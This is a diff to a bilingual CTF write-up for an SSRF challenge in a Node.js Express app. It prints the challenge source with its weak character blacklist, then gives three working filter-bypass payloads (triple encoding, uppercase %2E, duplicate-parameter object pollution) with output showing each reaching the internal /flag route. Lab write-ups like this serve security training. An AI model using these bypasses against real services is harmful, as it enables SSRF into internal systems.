@@ -6,7 +6,7 @@ Description:
 The goats thought they were safe behind the walls from the threat of the wolf!
 But they were not aware of the wolf's plan to bypass the wall!
 
-### Solution
+### Solution - EN
 
 The first hint was in the header, then we can get the source code:
 
@@ -111,10 +111,19 @@ private_s.get('/flag', function (request, result) {
 ```
 
 We have to access the `http://localhost:9000/flag` to get flag.
-But the common symbols to do path traversal was blocked：`.`、`2e`
+But the common symbols to do path traversal was blocked：`.`, `2e`
 
-Even the unicode bypass char was blocked：`┮`、`Ｎ`、`Ｅ`
+Even the unicode bypass char was blocked：`┮`, `Ｎ`
 (from Orange Tsai：[A New Era Of SSRF](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf))
+
+It uses normalizeUrl() to encode unicode character, so the unicode failure seems not working here.
+
+```
+Origin:    http://localhost:9001/documents/ＮＮ
+Normalize: http://localhost:9001/documents/%EF%BC%AE%EF%BC%AE
+```
+
+And I don't know why to block the char `Ｅ` XDDDD
 
 After few tries on the local, we can bypass easily by triple encoding、request with object type.
 You could even just use `%2E` because of the block char `%2e` wasn't case sensitive.
@@ -153,11 +162,174 @@ indexOf(.):-1
 
 `ASIS{68aaf2e4dd0e7ba28622aaed383bef4f}`
 
+### Solution - ZH-TW
+
+第一個提示藏在 Header 裡面，我們可以看到 `GET: source`，所以可以直接使用 `GET /source` 取得原始碼
+
+```
+HTTP/1.1 200 OK
+X-Powered-By: Express
+GET: source
+Content-Type: text/html; charset=utf-8
+Content-Length: 22
+ETag: W/"16-Ypo4AziLbHOiFWFpNXHkFH9U8Dc"
+Date: Tue, 23 Apr 2019 16:55:11 GMT
+Connection: close
+
+Hi, I'm a baby ssrf :)
+```
+
+下方這邊就是題目的原始碼，接下來我們就稍微 review 一下
+
+```=node.js=1
+const express = require("express");
+const body_parser = require('body-parser');
+const http = require('http')
+const public_s = express();
+const private_s = express();
+const normalizeUrl = require('normalize-url');
+
+public_s.use(body_parser.urlencoded({
+    extended: true
+}));
+
+public_s.get('/', function (request, result) {
+    result.setHeader('GET', 'source')
+    result.send("Hi, I'm a baby ssrf :)")
+    result.end()
+})
+
+public_s.get('/source', function(req, res) {
+    res.sendFile(__filename)
+  })
+
+public_s.use(function (req, res, next) {
+    var err = null;
+    try {
+        decodeURIComponent(req.path)
+    } catch (e) {
+        err = e;
+    }
+    if (err) {
+        res.sendStatus(400).end()
+    }
+    next();
+});
+
+public_s.post('/open/', (request, result) => {
+    document_name = request.body.document_name
+
+    if (document_name === undefined) {
+        result.end('bad')
+    }
+    console.log('http://localhost:9000/documents/' + document_name)
+    if (document_name.indexOf('.') >= 0 ||
+        document_name.indexOf("2e") >= 0 ||
+        document_name.indexOf("┮") >= 0 ||
+        document_name.indexOf("Ｅ") >= 0 ||
+        document_name.indexOf("Ｎ") >= 0) {
+        result.end('Please get your banana and leave!')
+    } else {
+        try {
+            var go_url = normalizeUrl('http://localhost:9000/documents/' + document_name)
+        } catch(error) {
+            var go_url = 'http://localhost:9000/documents/banana'
+        }
+        http.get(go_url, function (res) {
+            res.setEncoding('utf8');
+
+            if (res.statusCode == 200) {
+                res.on('data', function (chunk) {
+                    result.send(chunk)
+                    result.end()
+                });
+            } else {
+                result.end('Oops')
+            }
+        }).on('error', function (e) {
+            console.log("Got error: " + e.message);
+        });
+    }
+})
+
+public_s.listen(8000)
+private_s.listen(9000)
+
+private_s.get('/documents/banana', function (request, result) {
+    result.send("Here is your banana :D")
+    result.end()
+})
+
+private_s.get('/flag', function (request, result) {
+    result.send("flag{flag_is_here}")
+    result.end()
+})
+```
+
+Review 後，我們知道必須透過 SSRF 訪問 `http://localhost:9000/flag` 來取得 flag
+
+但是用來 path traversal 的字元都被 blocked 了，例如：`.`、`2e`，我們必須尋找其他的方法
+
+另外也有其他的 unicode 也被放進黑名單了：`┮`, `Ｎ`
+(from Orange Tsai：[A New Era Of SSRF](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf))
+
+但是 normalizeUrl() 會 encode unicode 的字元，所以上面提到利用 unicode bypass 的方式並不可行...
+
+encode 後的效果大概就如下方，所以真的沒有任何幫助
+
+```
+Origin:    http://localhost:9001/documents/ＮＮ
+Normalize: http://localhost:9001/documents/%EF%BC%AE%EF%BC%AE
+```
+
+然後我不知道為什麼要把 `Ｅ` 放進黑名單，就算是 unicode bypass 的方法好像也不關這個字元的事情...
+
+（可以參考最後面的 Bonus）
+
+再經過本地端的一些測試之後，我們可以發現有幾種方式可以簡單的 bypass 並且直接取得 flag！（這題真的蠻簡單的）
+
+1. triple encoding
+2. 利用傳遞重複參數名稱使物件型別變成 Object 使 indexOf 失效
+3. 利用 `%2E`（因為這邊只限制小寫的 `%2e` XD）
+```
+### console.log for test ###
+
+console.log('Origin:    http://localhost:9001/documents/' + document_name)
+console.log('Normalize: ' + normalizeUrl('http://localhost:9001/documents/' + document_name))
+console.log('Typeof:    ' + typeof(document_name))
+console.log('indexOf(.):' + document_name.indexOf('.'))
+
+######
+
+#1 bypass with triple encoding
+Request args：document_name_get=%25%32%45%25%32%45/flag
+Origin:    http://localhost:9001/documents/%2E%2E/flag
+Normalize: http://localhost:9001/flag
+Typeof:    string
+indexOf(.):-1
+
+#2 bypass with case sensitive
+Request args：document_name_get=%252E%252E/flag
+Origin:    http://localhost:9001/documents/%2E%2E/flag
+Normalize: http://localhost:9001/flag
+Typeof:    string
+indexOf(.):-1
+
+#3 bypass with object
+Request args：document_name_get=foo&document_name_get=/../../flag
+Origin:    http://localhost:9001/documents/foo,/../../flag
+Normalize: http://localhost:9001/flag
+Typeof:    object
+indexOf(.):-1
+```
+
+`ASIS{68aaf2e4dd0e7ba28622aaed383bef4f}`
 
 
 ### Reference
 
 https://blog.ssrf.in/post/nodejs-unicode-encoding-and-ssrf/
+
 https://mathiasbynens.be/notes/javascript-encoding
 
 
